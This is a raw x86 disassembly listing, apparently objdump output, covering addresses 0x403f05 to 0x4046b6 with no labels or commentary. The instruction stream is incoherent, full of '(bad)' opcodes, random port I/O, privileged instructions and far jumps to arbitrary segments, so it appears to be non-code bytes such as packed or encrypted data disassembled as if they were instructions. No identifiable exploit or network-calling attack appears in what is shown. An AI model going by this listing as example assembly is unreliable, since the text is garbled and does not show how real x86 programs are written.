  403f05:	jnp    0x403f37
  403f07:	imul   DWORD PTR [ebx+0x7a]
  403f0a:	fwait
  403f0b:	int3   
  403f0c:	adc    ah,dh
  403f0e:	mov    ds:0x1b5c1a01,eax
  403f13:	mov    ?,WORD PTR [ecx+0x50d4120e]
  403f19:	ret    0x914b
  403f1c:	popf   
  403f1d:	push   es
  403f1e:	jmp    0x4e8362ba
  403f23:	push   ds
  403f24:	sti    
  403f25:	arpl   WORD PTR [esi-0x3d56760c],si
  403f2b:	out    dx,al
  403f2c:	mov    al,ds:0x14d05426
  403f31:	mov    eax,ds:0xf3abb77
  403f36:	pop    edx
  403f37:	mov    esi,0x40162fe9
  403f3c:	and    eax,0xceee7715
  403f41:	xchg   esp,eax
  403f42:	popf   
  403f43:	inc    esp
  403f44:	cmp    ecx,DWORD PTR [esp+ebx*2]
  403f47:	femms  
  403f49:	mov    al,0xdd
  403f4b:	sahf   
  403f4c:	pop    eax
  403f4d:	repnz inc sp
  403f50:	push   ds
  403f51:	jnp    0x403ef8
  403f53:	lahf   
  403f54:	in     al,0x59
  403f56:	in     eax,0xc5
  403f58:	mov    ds:0x67af13a9,al
  403f5d:	xor    eax,0x8fb99121
  403f62:	fcmovnbe st,st(2)
  403f64:	enter  0x4905,0x71
  403f68:	(bad)  
  403f69:	cwde   
  403f6a:	pop    ebp
  403f6b:	mov    ds:0xd95dd618,eax
  403f70:	es mov al,0x8d
  403f73:	shl    DWORD PTR [eax+0x2e7975bd],0x80
  403f7a:	sbb    al,0x5c
  403f7c:	cdq    
  403f7d:	pop    ds
  403f7e:	sbb    DWORD PTR [ebx],ebx
  403f80:	mov    fs,ebx
  403f82:	jmp    0x403fa2
  403f84:	push   ds
  403f85:	add    bh,bh
  403f87:	pop    edi
  403f88:	sti    
  403f89:	sbb    al,0xbd
  403f8b:	lods   al,BYTE PTR ds:[esi]
  403f8c:	imul   ecx,edx,0xa179c25f
  403f92:	rcl    BYTE PTR [esi],1
  403f94:	call   0xfbca:0x72574b86
  403f9b:	sub    DWORD PTR [ecx+0x3d2da423],ebp
  403fa1:	or     dh,0x86
  403fa4:	sbb    ebx,DWORD PTR [ebx]
  403fa6:	stos   DWORD PTR es:[edi],eax
  403fa7:	jmp    0xa37d:0xb20f3077
  403fae:	jo     0x403f5c
  403fb0:	add    ebp,DWORD PTR [eax-0x77]
  403fb3:	or     BYTE PTR [edx],ch
  403fb5:	lods   eax,DWORD PTR ds:[esi]
  403fb6:	ss mov ch,0x1d
  403fb9:	jg     0x403fc1
  403fbb:	(bad)  
  403fbc:	retf   
  403fbd:	shl    DWORD PTR [edx-0x55],cl
  403fc0:	mov    dl,0x7c
  403fc2:	or     al,0xf0
  403fc4:	popa   
  403fc5:	and    BYTE PTR [eax+0x6a],0xf7
  403fc9:	xor    BYTE PTR [edi+0x5e],al
  403fcc:	xor    DWORD PTR [eax-0x45],0xffffffec
  403fd0:	sbb    al,0x64
  403fd2:	xlat   BYTE PTR ds:[ebx]
  403fd3:	mov    ebx,0xf797c332
  403fd8:	mov    al,0xf
  403fda:	dec    edx
  403fdb:	inc    edx
  403fdc:	data16 adc ch,BYTE PTR ss:[ecx+0x8fd233]
  403fe4:	mov    dh,0x5e
  403fe6:	sub    BYTE PTR [edi-0x3],bh
  403fe9:	pop    esp
  403fea:	and    al,0xbd
  403fec:	out    dx,eax
  403fed:	not    BYTE PTR [ebx-0x12]
  403ff0:	inc    ebx
  403ff1:	xchg   ebp,eax
  403ff2:	fcmovu st,st(1)
  403ff4:	mov    al,al
  403ff6:	sbb    al,ah
  403ff8:	cmp    al,BYTE PTR [ecx+0x5020c5bd]
  403ffe:	inc    ebp
  403fff:	mov    eax,0x723c42f2
  404004:	xchg   edx,eax
  404005:	xchg   esp,eax
  404006:	mov    ds,edx
  404008:	leave  
  404009:	xchg   esp,eax
  40400a:	(bad)  
  40400b:	mov    ch,0x3d
  40400d:	(bad)  
  40400e:	jl     0x40406f
  404010:	bound  eax,QWORD PTR [ebp+0x63]
  404013:	inc    esi
  404014:	xchg   edx,eax
  404015:	mov    al,ds:0xcc6a29bf
  40401a:	mov    esp,0x777cae3f
  40401f:	loopne 0x404014
  404021:	mov    ecx,0x18dfea8d
  404026:	in     eax,0x7
  404028:	hlt    
  404029:	scas   al,BYTE PTR es:[edi]
  40402a:	clc    
  40402b:	jp     0x403fbb
  40402d:	inc    esi
  40402e:	sub    al,0xd0
  404030:	(bad)  
  404031:	in     eax,dx
  404032:	jne    0x403fd4
  404034:	std    
  404035:	iret   
  404036:	mov    al,ds:0x86b2323c
  40403b:	cwde   
  40403c:	jg     0x403fe9
  40403e:	sbb    DWORD PTR [ebx+0x77d4ed97],esi
  404044:	add    DWORD PTR [esi-0xa52dd22],edx
  40404a:	aaa    
  40404b:	fs push 0xaff511da
  404051:	shr    BYTE PTR [edi+0x103edd8f],cl
  404057:	mov    esi,0xef10e3c8
  40405c:	stc    
  40405d:	mov    bl,0x5d
  40405f:	push   ebx
  404060:	xchg   BYTE PTR [edi],dl
  404062:	loopne 0x40405d
  404064:	in     al,dx
  404065:	jl     0x403ff0
  404067:	mov    ebp,0x3a4bdf1
  40406c:	out    dx,al
  40406d:	das    
  40406e:	inc    ecx
  40406f:	sub    edx,DWORD PTR [ebx-0x32]
  404072:	push   edx
  404073:	std    
  404074:	arpl   WORD PTR [eax],di
  404076:	jbe    0x404020
  404078:	lods   eax,DWORD PTR ds:[esi]
  404079:	out    dx,al
  40407a:	(bad)  
  40407b:	out    dx,al
  40407c:	std    
  40407d:	fcomp  st(5)
  40407f:	fldenv [edi]
  404081:	add    dh,BYTE PTR [edi]
  404083:	loop   0x4040b4
  404085:	outs   dx,BYTE PTR ss:[esi]
  404087:	or     cl,BYTE PTR [edx+0x6beea37]
  40408d:	popf   
  40408e:	jo     0x4040e0
  404090:	and    bh,BYTE PTR [esi]
  404092:	push   0xffffffc0
  404094:	dec    esi
  404095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404096:	(bad)  
  404097:	fs push ebp
  404099:	(bad)  
  40409a:	out    0xcf,al
  40409c:	das    
  40409d:	(bad)  
  40409e:	xchg   ecx,eax
  40409f:	adc    eax,0x91ba7898
  4040a4:	test   DWORD PTR [edi],edi
  4040a6:	sbb    esp,ecx
  4040a8:	add    eax,0xe5261117
  4040ad:	xchg   BYTE PTR [eax-0x24],dl
  4040b0:	ins    BYTE PTR es:[edi],dx
  4040b1:	stos   BYTE PTR es:[edi],al
  4040b2:	stc    
  4040b3:	adc    esi,0x73dee231
  4040b9:	xchg   ebx,eax
  4040ba:	mov    al,ds:0xee5faaf1
  4040bf:	xchg   DWORD PTR [eax],eax
  4040c1:	pop    dx
  4040c3:	push   0xffffffec
  4040c5:	loope  0x404086
  4040c7:	(bad)  
  4040c9:	sub    ebp,ebx
  4040cb:	retf   0x9271
  4040ce:	lahf   
  4040cf:	ffree  st(5)
  4040d1:	or     ebx,DWORD PTR [ebx]
  4040d3:	add    dl,BYTE PTR [ecx+edx*4]
  4040d6:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d8:	into   
  4040d9:	das    
  4040da:	mov    eax,fs
  4040dc:	sbb    al,0xda
  4040de:	and    al,0xf8
  4040e0:	aaa    
  4040e1:	pop    esp
  4040e2:	lods   eax,DWORD PTR ds:[esi]
  4040e3:	push   ds
  4040e4:	les    ecx,FWORD PTR [esi]
  4040e6:	push   esp
  4040e7:	out    dx,eax
  4040e8:	(bad)  
  4040e9:	and    al,0xed
  4040eb:	add    BYTE PTR [edx+0x486f22d3],dl
  4040f1:	sbb    dh,ch
  4040f3:	jno    0x4040db
  4040f5:	enter  0xbbf8,0xb7
  4040f9:	mov    edx,DWORD PTR [esi+0x32]
  4040fc:	xor    ch,BYTE PTR [edx+0x48]
  4040ff:	outs   dx,DWORD PTR ds:[esi]
  404100:	jmp    0x4040e8
  404102:	aas    
  404103:	aas    
  404104:	xor    al,0x90
  404106:	(bad)  
  404107:	sbb    al,0x9f
  404109:	int3   
  40410a:	pusha  
  40410b:	stos   BYTE PTR es:[edi],al
  40410c:	push   edx
  40410d:	test   ah,bh
  40410f:	addr16 test al,0x53
  404112:	loope  0x4040c2
  404114:	loope  0x40410c
  404116:	(bad)  
  404117:	jmp    0x4040b7
  404119:	add    eax,esp
  40411b:	xchg   DWORD PTR [edx+0x31],esp
  40411e:	mov    bl,0x59
  404120:	das    
  404121:	fsubr  QWORD PTR [eax]
  404123:	dec    ebx
  404124:	ins    DWORD PTR es:[edi],dx
  404125:	push   edi
  404126:	pop    es
  404127:	xor    ebp,DWORD PTR [ecx+0x14]
  40412a:	dec    ebp
  40412b:	and    BYTE PTR [eax+0x7d],0xc2
  40412f:	cmp    DWORD PTR [ecx],ecx
  404131:	or     eax,0x8d8fc4c8
  404136:	jae    0x4040e1
  404138:	into   
  404139:	push   eax
  40413a:	mul    ebp
  40413c:	mov    esi,0x38428c06
  404141:	(bad)  
  404142:	scas   al,BYTE PTR es:[edi]
  404143:	adc    eax,0x1358b0ca
  404148:	imul   esi,DWORD PTR [edi],0xa56e10e3
  40414e:	int    0x13
  404150:	pop    es
  404151:	fsub   QWORD PTR [edi]
  404153:	cli    
  404154:	cwde   
  404155:	sbb    eax,0xf34e8f18
  40415a:	repnz mov esp,0xf2b3c46c
  404160:	out    0x8a,eax
  404162:	cld    
  404163:	rol    eax,1
  404165:	ficomp DWORD PTR [eax]
  404167:	cmp    al,0x99
  404169:	test   dh,dl
  40416b:	stos   BYTE PTR es:[edi],al
  40416c:	mov    al,0x82
  40416e:	add    DWORD PTR [ecx+edi*2+0x5d],edx
  404172:	xchg   DWORD PTR [ebx+edi*1+0x2a],edi
  404176:	lea    eax,[ebx]
  404178:	sub    BYTE PTR [ecx-0x48],bl
  40417b:	ja     0x404197
  40417d:	push   edx
  40417e:	mov    eax,0x6822207e
  404183:	push   cs
  404184:	ss xchg ebx,eax
  404186:	dec    ebp
  404187:	mov    cl,BYTE PTR [edx+0x791dac25]
  40418d:	out    dx,al
  40418e:	aam    0x6b
  404190:	xchg   ecx,eax
  404191:	or     DWORD PTR [edi-0x3a],edx
  404194:	dec    ebx
  404195:	dec    esp
  404196:	addr16 das 
  404198:	xor    eax,0xd414b7d9
  40419d:	xchg   esi,eax
  40419e:	adc    DWORD PTR [esi-0x4a01b7c5],edi
  4041a4:	in     al,0xb2
  4041a6:	(bad)  
  4041a7:	lahf   
  4041a8:	pop    esi
  4041a9:	sub    BYTE PTR [ebx+edi*8-0x17],cl
  4041ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ae:	(bad)  
  4041af:	aam    0x6d
  4041b1:	push   cs
  4041b2:	aam    0xe2
  4041b4:	call   0x4ef5259b
  4041b9:	(bad)  
  4041ba:	mov    ds:0x8a228fe0,al
  4041bf:	pop    edx
  4041c0:	lds    ecx,FWORD PTR [eax-0x13]
  4041c3:	adc    edi,DWORD PTR [edi+0x1c]
  4041c6:	dec    edx
  4041c7:	test   DWORD PTR [ebx],ebx
  4041c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ca:	or     DWORD PTR [eax],edx
  4041cc:	mov    eax,ds:0x31b275a9
  4041d1:	popa   
  4041d2:	ja     0x404189
  4041d4:	loopne 0x4041a8
  4041d6:	jmp    0x404195
  4041d8:	scas   al,BYTE PTR es:[edi]
  4041d9:	imul   edx,DWORD PTR [eax],0x7e
  4041dc:	inc    esi
  4041dd:	leave  
  4041de:	xor    DWORD PTR [ebp+0x23e2e57a],0x30
  4041e5:	(bad)  
  4041e6:	(bad)  
  4041e8:	sub    eax,0x86cdf197
  4041ed:	test   eax,0x35ef8528
  4041f2:	test   eax,esp
  4041f4:	(bad)  
  4041f6:	add    ch,ch
  4041f8:	loopne 0x4041dd
  4041fa:	mov    bl,0x2e
  4041fc:	bnd jb 0x4041d2
  4041ff:	nop
  404200:	adc    eax,0x327d47be
  404205:	ss cmp bl,bh
  404208:	retf   0x4565
  40420b:	lahf   
  40420c:	cld    
  40420d:	jmp    0x225f:0x6534aa88
  404214:	sbb    DWORD PTR [ebp-0x36],edx
  404217:	inc    edx
  404218:	ins    DWORD PTR es:[edi],dx
  404219:	call   0x6357:0x20e9797
  404220:	fnstenv [esp+esi*2+0x6]
  404224:	sbb    ebp,DWORD PTR [ebx+0x68415cc0]
  40422a:	mov    esi,0x977be02
  40422f:	bound  eax,QWORD PTR [ebp-0x22]
  404232:	xchg   esp,eax
  404233:	pop    ds
  404234:	psllq  mm6,QWORD PTR [edi-0x44931f0f]
  40423b:	icebp  
  40423c:	adc    DWORD PTR [ebp+0x68],edi
  40423f:	int3   
  404240:	add    dl,BYTE PTR [eax-0xabb3b62]
  404246:	and    esp,DWORD PTR [edx]
  404248:	and    BYTE PTR [ecx+0x37],ah
  40424b:	out    0xdf,al
  40424d:	sub    ebp,ebp
  40424f:	push   cs
  404250:	(bad)  
  404251:	rcl    ah,cl
  404253:	mov    dh,0xec
  404255:	int    0x6e
  404257:	retf   
  404258:	mov    BYTE PTR [eax+0x43b6291e],bl
  40425e:	pop    esp
  40425f:	pop    ebp
  404260:	popf   
  404261:	sbb    cl,dh
  404263:	fimul  WORD PTR [eax]
  404265:	cmp    al,0xbf
  404267:	out    0xae,al
  404269:	ja     0x4042ba
  40426b:	push   esi
  40426c:	enter  0x6c65,0xc9
  404270:	leave  
  404271:	mov    dl,0xc3
  404273:	ret    0x2a27
  404276:	pop    ecx
  404277:	xchg   edx,eax
  404278:	add    BYTE PTR [edi+0x5e],al
  40427b:	cmp    BYTE PTR [ebx-0x74],ch
  40427e:	nop
  40427f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404280:	jl     0x40420c
  404282:	call   0x3936:0xc05ca434
  404289:	xor    esi,DWORD PTR [edi+ecx*1+0x5bb8aab0]
  404290:	cwde   
  404291:	outs   dx,BYTE PTR ds:[esi]
  404292:	mov    ds:0xccad24f,eax
  404297:	retf   
  404298:	ins    BYTE PTR es:[edi],dx
  404299:	jge    0x404274
  40429b:	std    
  40429c:	push   ss
  40429d:	call   0xe379:0x3daacb6c
  4042a4:	js     0x404311
  4042a6:	call   0xd459124d
  4042ab:	mov    eax,0xf93c9a38
  4042b0:	ins    BYTE PTR es:[edi],dx
  4042b1:	adc    DWORD PTR [ebx-0x7d],esp
  4042b4:	mov    BYTE PTR [ecx+0x3d],0x8d
  4042b8:	aaa    
  4042b9:	mov    ebp,0xb17cb32b
  4042be:	stc    
  4042bf:	and    eax,0xf3742fae
  4042c4:	hlt    
  4042c5:	adc    bl,ch
  4042c7:	addr16 (bad) 
  4042c9:	and    eax,0xf8f0cb63
  4042ce:	mov    dh,0xa1
  4042d0:	(bad)  
  4042d1:	adc    BYTE PTR [edx-0x614573e8],0x9a
  4042d8:	pop    esi
  4042d9:	cld    
  4042da:	test   BYTE PTR [eax],ah
  4042dc:	stc    
  4042dd:	out    0xa8,eax
  4042df:	sub    ecx,DWORD PTR [eax+0x67d9e4f3]
  4042e5:	dec    cl
  4042e7:	test   DWORD PTR [ebp+0x332d65bb],esi
  4042ed:	pop    edx
  4042ee:	or     bh,BYTE PTR [ecx-0x42fe4abc]
  4042f4:	push   edi
  4042f5:	mov    bl,0x4a
  4042f7:	inc    ebx
  4042f8:	mov    ebp,DWORD PTR [ebx-0x5b]
  4042fb:	jge    0x40431a
  4042fd:	inc    esp
  4042fe:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  404300:	cmp    al,0xa9
  404302:	push   edi
  404303:	xchg   esp,eax
  404304:	jo     0x4042a9
  404306:	dec    esi
  404307:	int3   
  404308:	int3   
  404309:	es or  al,0x3a
  40430c:	add    al,0x61
  40430e:	pusha  
  40430f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404310:	cmp    BYTE PTR [edi],bh
  404312:	syscall 
  404314:	out    0x10,eax
  404316:	data16 sbb al,BYTE PTR [eax-0x71]
  40431a:	cmp    BYTE PTR [ebx+0x47],dh
  40431d:	push   edx
  40431e:	lock call 0xf988:0x3f932c4a
  404326:	cld    
  404327:	push   es
  404328:	push   0x1f
  40432a:	sub    bh,BYTE PTR [ebx]
  40432c:	cmp    esp,DWORD PTR [ecx+0x4a]
  40432f:	das    
  404330:	lea    esi,ds:0x59ec8a42
  404336:	not    ch
  404338:	dec    edx
  404339:	dec    eax
  40433a:	(bad)  
  40433b:	mov    ds:0x28cbe046,al
  404340:	rcr    DWORD PTR [edx+edx*1+0x4f1132f9],0x76
  404348:	daa    
  404349:	test   BYTE PTR [eax],dh
  40434b:	dec    edx
  40434c:	cmp    esi,DWORD PTR [esi+edx*2+0x7193ad75]
  404353:	arpl   WORD PTR [edi],cx
  404355:	pop    esi
  404356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404357:	push   esi
  404358:	hlt    
  404359:	mov    ebx,0x436f7748
  40435e:	mov    dh,0x6
  404360:	in     al,0x1
  404362:	xchg   esp,eax
  404363:	pop    esp
  404364:	dec    edi
  404365:	add    ebp,ebx
  404367:	sbb    al,0x9b
  404369:	mov    edi,0xa208fb1b
  40436e:	jbe    0x404318
  404370:	call   0x7fff:0xdc35baa0
  404377:	mov    ah,0x94
  404379:	rcr    BYTE PTR [edx-0x5ed21cd4],cl
  40437f:	pop    eax
  404380:	dec    ebp
  404381:	lock imul esi,DWORD PTR [ebp+0x67],0xe920951a
  404389:	pop    ebp
  40438a:	outs   dx,BYTE PTR ds:[esi]
  40438b:	mov    cl,dh
  40438d:	mul    DWORD PTR [ebx]
  40438f:	dec    ebx
  404390:	popf   
  404391:	add    dl,ah
  404393:	push   ss
  404394:	cmc    
  404395:	jecxz  0x404377
  404397:	retf   0x4cc7
  40439a:	int    0xaa
  40439c:	idiv   DWORD PTR [ecx-0x18]
  40439f:	pop    esi
  4043a0:	add    BYTE PTR cs:[ecx-0xe63322d],dh
  4043a7:	dec    esp
  4043a8:	cmp    al,0xc4
  4043aa:	std    
  4043ab:	xor    al,0x89
  4043ad:	xchg   edi,eax
  4043ae:	out    0xdb,al
  4043b0:	icebp  
  4043b1:	lods   al,BYTE PTR ds:[esi]
  4043b2:	(bad)  
  4043b3:	scas   eax,DWORD PTR es:[edi]
  4043b4:	dec    eax
  4043b5:	fsubp  st(3),st
  4043b7:	outs   dx,BYTE PTR ds:[esi]
  4043b8:	repz and DWORD PTR ds:0x9d57fd83,edi
  4043bf:	lods   eax,DWORD PTR ds:[esi]
  4043c0:	cmc    
  4043c1:	mov    cl,0x55
  4043c3:	shr    BYTE PTR [eax],cl
  4043c5:	dec    sp
  4043c7:	or     BYTE PTR [edx+0x7f8062f5],dh
  4043cd:	scas   al,BYTE PTR es:[edi]
  4043ce:	call   0x2e48:0xb550e365
  4043d5:	and    bl,BYTE PTR [edx]
  4043d7:	pop    ecx
  4043d8:	add    eax,edx
  4043da:	sbb    ah,BYTE PTR [ebx+0x5f]
  4043dd:	adc    edx,0x86d6f976
  4043e3:	(bad)  
  4043e4:	sti    
  4043e5:	mov    BYTE PTR [edx+0x6f],bl
  4043e8:	paddsb mm0,QWORD PTR es:[ebp-0xc87cfa2]
  4043f0:	push   esp
  4043f1:	add    eax,0xf8f0a9b7
  4043f6:	mov    ds:0x8b426401,al
  4043fb:	clc    
  4043fc:	in     al,0x22
  4043fe:	adc    BYTE PTR [eax+0x25],cl
  404401:	cmp    BYTE PTR [edi],dl
  404403:	mov    eax,0x6fc1e35e
  404408:	push   ebp
  404409:	jno    0x4043f3
  40440b:	jge    0x404402
  40440d:	std    
  40440e:	jle    0x4043f9
  404410:	push   ebx
  404411:	pushf  
  404412:	into   
  404413:	(bad)  
  404416:	nop
  404417:	jmp    0x4254:0x7c63cf35
  40441e:	push   ss
  40441f:	stos   DWORD PTR es:[edi],eax
  404420:	sub    DWORD PTR [ebx],esi
  404422:	sbb    ah,dh
  404424:	cld    
  404425:	ficom  DWORD PTR [ebx]
  404427:	in     eax,dx
  404428:	sti    
  404429:	outs   dx,BYTE PTR ds:[esi]
  40442a:	pop    ecx
  40442b:	mov    bh,0x96
  40442d:	shl    BYTE PTR [ebx-0x70109cf1],1
  404433:	xchg   edi,eax
  404434:	js     0x4043c6
  404436:	inc    esi
  404437:	adc    cl,BYTE PTR [ebx]
  404439:	jnp    0x4044b7
  40443b:	jge    0x40441e
  40443d:	and    BYTE PTR [edx-0x3],cl
  404440:	push   ebp
  404441:	repnz adc eax,0x90bc0767
  404447:	(bad)  
  404448:	mov    ds:0xf99777a9,eax
  40444d:	in     eax,0x7e
  40444f:	std    
  404450:	xchg   ebx,eax
  404451:	jbe    0x4043df
  404453:	dec    ecx
  404454:	xchg   ecx,eax
  404455:	cdq    
  404456:	clc    
  404457:	out    dx,al
  404458:	repz pop esp
  40445a:	retf   0x73b6
  40445d:	addr16 jmp 0x404410
  404460:	cmp    ah,bl
  404462:	les    esp,FWORD PTR ds:[edx+ecx*2-0x372a32a1]
  40446a:	gs xchg edx,eax
  40446c:	stos   BYTE PTR es:[edi],al
  40446d:	pop    esi
  40446e:	xor    eax,0xec7205d0
  404473:	cs movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404476:	mov    ebp,0xf3d9a50e
  40447b:	mov    ecx,0xe2a075dd
  404480:	mov    ds:0xe5af11e5,eax
  404485:	sbb    bl,dh
  404487:	or     DWORD PTR [ebx-0x7c5fd1a6],0xa8e6bcfc
  404491:	and    BYTE PTR [ecx],dl
  404493:	mov    WORD PTR [edx],bx
  404496:	sub    al,BYTE PTR [edi-0x553cb77c]
  40449c:	retf   
  40449d:	push   edx
  40449e:	xor    esi,ecx
  4044a0:	sbb    bl,bl
  4044a2:	test   al,0x8d
  4044a4:	lahf   
  4044a5:	out    dx,al
  4044a6:	add    edx,ebp
  4044a8:	dec    esi
  4044a9:	jno    0x40444f
  4044ab:	or     eax,0x9101397f
  4044b0:	mov    dl,0x53
  4044b2:	arpl   WORD PTR [ebx+0x3f0b52be],bx
  4044b8:	inc    edi
  4044b9:	hlt    
  4044ba:	cmp    ebp,esi
  4044bc:	pop    esp
  4044bd:	das    
  4044be:	cdq    
  4044bf:	inc    esi
  4044c0:	jl     0x4044d3
  4044c2:	(bad)  
  4044c3:	or     eax,0x885d3974
  4044c8:	jno    0x4044ba
  4044ca:	xchg   edi,eax
  4044cb:	rcl    BYTE PTR [eax],cl
  4044cd:	fcomi  st,st(7)
  4044cf:	(bad)  
  4044d0:	rol    ebx,cl
  4044d2:	stos   BYTE PTR es:[edi],al
  4044d3:	xor    ebp,DWORD PTR [esi+0x5e]
  4044d6:	mov    dl,0xd1
  4044d8:	lods   al,BYTE PTR ds:[esi]
  4044d9:	(bad)  
  4044da:	sti    
  4044db:	lds    ebp,FWORD PTR [ebx]
  4044dd:	fwait
  4044de:	pop    ecx
  4044df:	fs inc ecx
  4044e1:	enter  0x2c54,0xa7
  4044e5:	mov    ?,edi
  4044e7:	push   0xffffff9d
  4044e9:	xor    al,0x30
  4044eb:	mov    edx,0x3636774d
  4044f0:	pop    ecx
  4044f1:	ja     0x40451e
  4044f3:	ret    
  4044f4:	and    DWORD PTR [esi+0xf52f5b1],esp
  4044fa:	loopne 0x404554
  4044fc:	shr    BYTE PTR [esi-0x2ee8aa77],cl
  404502:	add    al,0xb0
  404504:	(bad)  
  404505:	(bad)  
  404506:	mov    esp,0xf9f6893c
  40450b:	and    BYTE PTR [edx+0x4e],ch
  40450e:	test   eax,0xd6752205
  404513:	mov    WORD PTR [ecx],cs
  404515:	mov    dl,0xe0
  404517:	int    0x93
  404519:	mov    BYTE PTR [ebx-0x4aec238e],ah
  40451f:	jecxz  0x404524
  404521:	sub    BYTE PTR [esi-0x59],bh
  404524:	shl    BYTE PTR [edx-0x4d],0x5
  404528:	pop    esi
  404529:	icebp  
  40452a:	(bad)
  40452e:	div    BYTE PTR [esi]
  404530:	adc    al,0x19
  404532:	ret    
  404533:	sbb    ebp,DWORD PTR [ecx+0x538632eb]
  404539:	fxch   st(0)
  40453b:	push   eax
  40453c:	stc    
  40453d:	mov    edi,esp
  40453f:	mov    eax,0xa57abad1
  404544:	fisttp QWORD PTR [edi-0x45]
  404547:	sub    ah,BYTE PTR [edx-0x734e5f98]
  40454d:	add    DWORD PTR [edi+0x67],esi
  404550:	or     al,0x1
  404552:	hlt    
  404553:	dec    ebx
  404554:	mov    ebx,0xe594b196
  404559:	adc    eax,0x92f44a1a
  40455e:	pushf  
  40455f:	push   edx
  404560:	aas    
  404561:	push   cs
  404562:	nop
  404563:	and    DWORD PTR [ebp-0x4b],0xffffffcf
  404567:	ret    0xbe6f
  40456a:	mov    esi,0x9830f054
  40456f:	rol    bh,0x48
  404572:	cdq    
  404573:	ret    0x47f3
  404576:	push   ds
  404577:	mov    WORD PTR [eax],cs
  404579:	pop    ss
  40457a:	arpl   WORD PTR [ecx-0x2d],cx
  40457d:	int    0x83
  40457f:	push   eax
  404580:	inc    esp
  404581:	les    esp,FWORD PTR [ecx]
  404583:	mov    cl,0x77
  404585:	call   0x9dea:0xfd82d3f3
  40458c:	jmp    0x463a:0x239a2d56
  404593:	pop    ebp
  404594:	inc    ebp
  404595:	outs   dx,DWORD PTR ds:[esi]
  404596:	lahf   
  404597:	and    BYTE PTR [ebp+0x168fd285],cl
  40459d:	mov    edi,0xc8dd4ea2
  4045a2:	dec    ecx
  4045a3:	push   es
  4045a4:	pop    ebx
  4045a5:	cmp    eax,0xd811ac18
  4045aa:	(bad)  
  4045ab:	clc    
  4045ac:	mov    cl,0x30
  4045ae:	xor    eax,0x7fe40001
  4045b3:	add    DWORD PTR [ebx-0x3],esp
  4045b6:	xchg   ebx,eax
  4045b7:	out    dx,al
  4045b8:	adc    cl,BYTE PTR [edi-0x2fff35bf]
  4045be:	xchg   edi,eax
  4045bf:	push   edx
  4045c0:	into   
  4045c1:	dec    edi
  4045c2:	push   ebx
  4045c3:	cmp    ebx,DWORD PTR [esi-0x24]
  4045c6:	pop    esi
  4045c7:	dec    esi
  4045c8:	fst    QWORD PTR [esi-0x4e3fc1f8]
  4045ce:	out    0xfd,eax
  4045d0:	jmp    0x404597
  4045d2:	add    eax,0x221f5f68
  4045d7:	inc    ebx
  4045d8:	icebp  
  4045d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045da:	add    edx,DWORD PTR [edx+0x42]
  4045dd:	jns    0x404643
  4045df:	arpl   ax,dx
  4045e1:	cmp    eax,0x307a21e4
  4045e6:	mov    DWORD PTR [eax],eax
  4045e8:	shl    ecx,1
  4045ea:	test   DWORD PTR [eax],0x908f83ed
  4045f0:	push   es
  4045f1:	ins    BYTE PTR es:[edi],dx
  4045f2:	mov    ds:0x85139bc6,al
  4045f7:	xchg   ecx,eax
  4045f8:	fst    st(5)
  4045fa:	and    ebp,DWORD PTR [ebp+ebx*2+0x21c81dc0]
  404601:	lods   eax,DWORD PTR ds:[esi]
  404602:	scas   eax,DWORD PTR es:[edi]
  404603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404604:	mov    al,ds:0x5595554d
  404609:	dec    al
  40460b:	sbb    al,0x54
  40460d:	inc    esi
  40460e:	inc    edi
  40460f:	sub    DWORD PTR [ebx+0x1ccc2b76],ecx
  404615:	mov    esp,0xfab5b826
  40461a:	inc    eax
  40461b:	daa    
  40461c:	scas   eax,DWORD PTR es:[edi]
  40461d:	jl     0x404637
  40461f:	add    al,0x84
  404621:	adc    bl,0x97
  404624:	aaa    
  404625:	mov    ch,0x8
  404627:	lahf   
  404628:	inc    ecx
  404629:	scas   eax,DWORD PTR es:[edi]
  40462a:	test   DWORD PTR [ecx-0x2b],0x467a1ca3
  404631:	mov    BYTE PTR [ecx-0x36],ch
  404634:	scas   eax,DWORD PTR es:[edi]
  404635:	jl     0x4045bb
  404637:	(bad)  
  404638:	mov    ch,0xc0
  40463a:	inc    edi
  40463b:	ins    DWORD PTR es:[edi],dx
  40463c:	data16 sbb bl,BYTE PTR [ecx+esi*4]
  404640:	pop    ds
  404641:	stos   DWORD PTR es:[edi],eax
  404642:	xchg   esp,eax
  404643:	ret    0xb5a6
  404646:	fidivr WORD PTR [edx]
  404648:	push   eax
  404649:	xchg   esi,edi
  40464b:	cmp    eax,0x2f2b0dec
  404650:	scas   al,BYTE PTR es:[edi]
  404651:	mov    WORD PTR [eax+0x47053a68],fs
  404657:	retf   0x36db
  40465a:	repz sbb ah,BYTE PTR [bp+si-0x2c]
  40465f:	inc    eax
  404660:	mov    bh,0x7c
  404662:	adc    al,0xd5
  404664:	test   esp,ebx
  404666:	std    
  404667:	stc    
  404668:	(bad)  
  404669:	aam    0x7d
  40466b:	pop    edi
  40466c:	test   DWORD PTR [ecx+0x72],esi
  40466f:	pop    eax
  404670:	aaa    
  404671:	arpl   WORD PTR [eax+0x4d601aeb],sp
  404677:	xlat   BYTE PTR ds:[ebx]
  404678:	push   ds
  404679:	xchg   edx,eax
  40467a:	sub    esi,DWORD PTR [edx-0xb]
  40467d:	pop    edx
  40467e:	icebp  
  40467f:	mov    edx,0xc2b3f104
  404684:	or     BYTE PTR [edi-0x5486a031],bl
  40468a:	call   DWORD PTR [eax*1-0x75b79066]
  404691:	mov    edi,0x2e22097
  404696:	int    0xd5
  404698:	xor    esp,DWORD PTR [ecx+0x30]
  40469b:	pusha  
  40469c:	enter  0xd46e,0x46
  4046a0:	aas    
  4046a1:	lea    ebp,[ebx-0x7b]
  4046a4:	inc    edx
  4046a5:	shl    DWORD PTR [edi+ebp*8-0x5e44b078],1
  4046ac:	inc    eax
  4046ad:	inc    ebx
  4046ae:	xor    al,0x7f
  4046b1:	mov    eax,ds:0x10f3162
  4046b6:	cmp    edi,DWORD PTR [ecx-0x4828be02]
